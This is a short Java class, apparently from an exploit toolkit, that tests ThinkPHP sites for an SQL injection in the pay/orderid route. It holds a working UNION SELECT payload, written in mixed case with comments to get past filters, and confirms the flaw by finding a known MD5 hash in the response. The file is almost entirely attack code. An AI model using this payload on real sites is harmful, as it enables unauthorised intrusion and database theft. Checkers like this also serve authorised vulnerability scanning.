package com.leishianquan.exp;

import com.leishianquan.model.BasePayload;
import com.leishianquan.util.Dialog;
import com.leishianquan.util.HttpTool;

public class thinkphp_pay_orderid_sqli implements BasePayload {
    private static final String CheckStr="56540676a129760a";

    public boolean checkVUL(String url) throws Exception{

        try {
            String test_result = HttpTool.getHttpReuest(url + "/index.php?s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/Md5(2333)--+", "utf-8");
            if(test_result.contains(CheckStr)){
                return true;}

        } catch (Exception e) {
//            Dialog.alert_Dialog("txf提示你",null,"连接超时");
        }
        return false;
    }


}